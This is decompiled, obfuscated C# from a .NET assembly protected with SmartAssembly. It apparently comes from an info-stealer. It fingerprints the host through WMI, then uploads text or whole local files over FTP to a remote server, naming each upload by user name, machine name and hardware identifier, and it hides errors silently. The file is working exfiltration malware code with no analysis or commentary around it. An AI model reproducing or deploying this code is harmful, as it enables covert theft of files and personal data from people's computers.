using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace EJhaxGWLzpBbb;

internal sealed class GtRYKNkRmbf
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string iFtjToyyGJbdg()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107198409));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107198356)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107198371);
			ManagementObject val3 = new ManagementObject(getString_0(107198334) + text + getString_0(107198293));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107198320)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107088072);
		}
	}

	public static void WUllNQmIlVwFwrS(string dIvwVSVIYwfCu = "URL", string XQsmGSvzAgcyiP = "USERNAME", string JOwXkSqnYElxQme = "ACCESO", string SxVyaTHxWTt = "")
	{
		try
		{
			string text = iFtjToyyGJbdg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(dIvwVSVIYwfCu + getString_0(107199791) + Environment.UserName + getString_0(107199746) + Environment.MachineName + getString_0(107199757) + text + getString_0(107199752));
			ftpWebRequest.Method = getString_0(107198263);
			ftpWebRequest.Credentials = new NetworkCredential(XQsmGSvzAgcyiP, JOwXkSqnYElxQme);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(SxVyaTHxWTt);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void WWRIlNqXKavKj(string NnvfzfXlhEHyeGGV = "URL", string xBkcFiBGWFDj = "USERNAME", string PJrbrXkhYuo = "ACCESO", string MdpSlpMfXJJI = "")
	{
		try
		{
			string text = iFtjToyyGJbdg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(NnvfzfXlhEHyeGGV + getString_0(107199791) + Environment.UserName + getString_0(107199746) + Environment.MachineName + getString_0(107199757) + text + getString_0(107199757) + Path.GetFileName(MdpSlpMfXJJI));
			ftpWebRequest.Method = getString_0(107198263);
			ftpWebRequest.Credentials = new NetworkCredential(xBkcFiBGWFDj, PJrbrXkhYuo);
			byte[] array = File.ReadAllBytes(MdpSlpMfXJJI);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static GtRYKNkRmbf()
	{
		Strings.CreateGetStringDelegate(typeof(GtRYKNkRmbf));
	}
}
